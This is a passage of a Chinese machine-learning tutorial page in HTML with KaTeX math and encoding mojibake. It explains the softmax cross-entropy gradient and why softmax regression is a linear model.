class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">æ—¶èµ·ä½œç”¨</span><span class="mclose">)</span></span></span></span></span>ï¼Œæ‰€ä»¥ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo>âˆ’</mo><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j} = \hat{y_j} - y_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>å°±ä¸ä¼šå­˜åœ¨ä»¥ä¸Šé—®é¢˜ï¼Œå…¶æ¢¯åº¦ä¸è¯¯å·®æˆæ­£æ¯”ï¼Œæ¢¯åº¦è¶Šå¤§ï¼Œæ›´æ–°åŠ›åº¦è¶Šå¤§ã€‚</p>
<h3 data-id="heading-4">1.2 ä¸ºä»€ä¹ˆä¹¦ä¸Šåªæ¨å¯¼äº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4224em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼Œè€Œçœç•¥äº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>w</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial w_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4224em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0269em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼Ÿ</h3>
<p>æˆ‘ä»¬çš„æœ€ç»ˆå¿…ç„¶æ˜¯è¦æ±‚æŸå¤±å‡½æ•°é’ˆå¯¹äºå‚æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">w</mi></mrow><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf" style="margin-right:0.01597em;">w</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span> çš„å¯¼æ•°ï¼Œè€Œä»¥ä¸Šæ¨å¯¼æ˜¯æ˜¯å¯¹äº<code>softmax</code>+äº¤å‰ç†µæŸå¤±ï¼Œsoftmaxè¿™ä¸€å±‚çš„æ¢¯åº¦å…¬å¼å°±æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo>âˆ’</mo><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\hat{y_j} - y_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œä¸å‰é¢ç½‘ç»œçš„ç»“æ„æ²¡æœ‰å…³ç³»ã€‚</p>
<p>è€Œåœ¨softmaxä¹‹å‰ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="bold">O</mi><mo>=</mo><mi mathvariant="bold">X</mi><mi mathvariant="bold">W</mi><mo>+</mo><mi mathvariant="bold">b</mi></mrow><annotation encoding="application/x-tex">\mathbf{O} = \mathbf{X}\mathbf{W} + \mathbf{b}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6861em;"/><span class="mord mathbf">O</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7694em;vertical-align:-0.0833em;"/><span class="mord mathbf" style="margin-right:0.01597em;">XW</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathbf">b</span></span></span></span></span></div>
<p>è¿™æ˜¯ä¸€ä¸ªçº¿æ€§å±‚ï¼Œæ‰€ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>o</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>w</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><msub><mi>x</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial o}{\partial w_j} = x_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4224em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0269em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</p>
<p>å®ƒä¹‹æ‰€ä»¥è¢«å•ç‹¬æå‡ºæ¥è¯¦ç»†æ¨å¯¼ï¼Œæ˜¯å› ä¸ºï¼š</p>
<ol>
<li><strong>å®ƒæ˜¯ä¸€ä¸ªæ ¸å¿ƒä¸”é€šç”¨çš„ç»“æœ</strong>ï¼šåªè¦è¾“å‡ºå±‚æ˜¯Softmax+äº¤å‰ç†µæŸå¤±ï¼Œè¿™ä¸ªæ¢¯åº¦å…¬å¼å°±æ°¸è¿œæ˜¯ Y^âˆ’Yï¼Œä¸ç½‘ç»œå‰é¢çš„ç»“æ„æ— å…³ã€‚</li>
<li><strong>å®ƒæå…¶ç®€æ´</strong>ï¼Œä½“ç°äº†æ•°å­¦çš„ç¾æ„Ÿã€‚</li>
<li>ç†è§£è¿™ä¸€æ­¥æ˜¯ç†è§£æ•´ä¸ªåå‘ä¼ æ’­è¿‡ç¨‹çš„åŸºç¡€ã€‚ç°ä»£çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ï¼ˆå¦‚PyTorchã€TensorFlowï¼‰ä¼šè‡ªåŠ¨å®Œæˆé“¾å¼æ³•åˆ™çš„å…¶ä»–éƒ¨åˆ†ï¼Œä½†ç†è§£è¿™ä¸ªèµ·ç‚¹çš„è®¡ç®—åŸç†è‡³å…³é‡è¦ã€‚</li>
</ol>
<h2 data-id="heading-5">2. softmaxå›å½’ä¸ºä»€ä¹ˆæ˜¯çº¿æ€§æ¨¡å‹</h2>
<blockquote>
<p>å°½ç®¡softmaxæ˜¯ä¸€ä¸ªéçº¿æ€§å‡½æ•°ï¼Œä½†softmaxå›å½’çš„è¾“å‡ºä»ç„¶ç”±è¾“å…¥ç‰¹å¾çš„ä»¿å°„å˜æ¢å†³å®šã€‚ å› æ­¤ï¼Œsoftmaxå›å½’æ˜¯ä¸€ä¸ª<em>çº¿æ€§æ¨¡å‹</em>ï¼ˆlinear modelï¼‰ã€‚</p>
</blockquote>
<p>æ€»çš„æ¥è¯´ï¼Œ<code>softmax</code>å›å½’åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li><code>çº¿æ€§éƒ¨åˆ†ï¼ˆä»¿å°„å˜æ¢ï¼‰</code>ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">o</mi><mo>=</mo><mi mathvariant="bold">w</mi><mi mathvariant="bold">x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">\mathbf{o} = \mathbf{w}\mathbf{x} + b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">o</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathbf">wx</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span>;</li>
<li><code>éçº¿æ€§éƒ¨åˆ†ï¼ˆsoftmaxå‡½æ•°ï¼‰</code>ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo>=</mo><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>o</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\hat{y_j} = softmax(o_j) = \frac{e^{o_j}}{\sum_{i=1}^{n}e^{o_i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.5093em;vertical-align:-0.57em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9393em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7047em;"><span style="top:-2.1786em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.8971em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3214em;"><span/></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"/><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6401em;"><span style="top:-2.8326em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight">i</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.779em;"><span style="top:-2.9714em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.57em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></li>
</ol>
<p>è€Œçº¿æ€§éƒ¨åˆ†å®šä¹‰äº†å†³ç­–çš„è¾¹ç•Œï¼Œæœ€ç»ˆçš„åˆ†ç±»å†³ç­–è§„åˆ™å§‹ç»ˆå–å†³äºçº¿æ€§éƒ¨åˆ†çš„ç»“æœï¼Œç¬¬äºŒéƒ¨åˆ†åªæ˜¯å°†è¾“å‡ºæ ¡å‡†ä¸ºæœ‰æ„ä¹‰çš„æ¦‚ç‡å€¼ï¼Œä¾¿äºè§£é‡Šå’Œè®¡ç®—æŸå¤±ã€‚</p>
<p>ä¸€ä¸ªæ¯”å–»ï¼š
æƒ³è±¡ä½ ç”¨ä¸‰ä¸ªä¸åŒçš„ç§¤ï¼ˆå¯¹åº”ä¸‰ä¸ªç±»åˆ«ï¼‰å»ç§°ä¸€ä¸ªç‰©ä½“ï¼ˆå¯¹åº”ä¸€ä¸ªæ ·æœ¬ï¼‰ã€‚æ¯ä¸ªç§¤ç»™å‡ºä¸€ä¸ªè¯»æ•°ï¼ˆå¯¹åº”<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">o_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼‰ã€‚</p>
<ul>
<li><strong>softmaxå‡½æ•°</strong>çš„ä½œç”¨å°±åƒæ˜¯æŠŠè¿™ä¸‰ä¸ªè¯»æ•°éƒ½è½¬æ¢æˆâ€œè¿™ä¸ªç‰©ä½“æœ€å¯èƒ½è¢«å“ªä¸ªç§¤ç§°å‡ºæ¥â€çš„æ¦‚ç‡ç™¾åˆ†æ¯”ã€‚è¿™æ˜¯ä¸€ä¸ªéçº¿æ€§è½¬æ¢ã€‚</li>
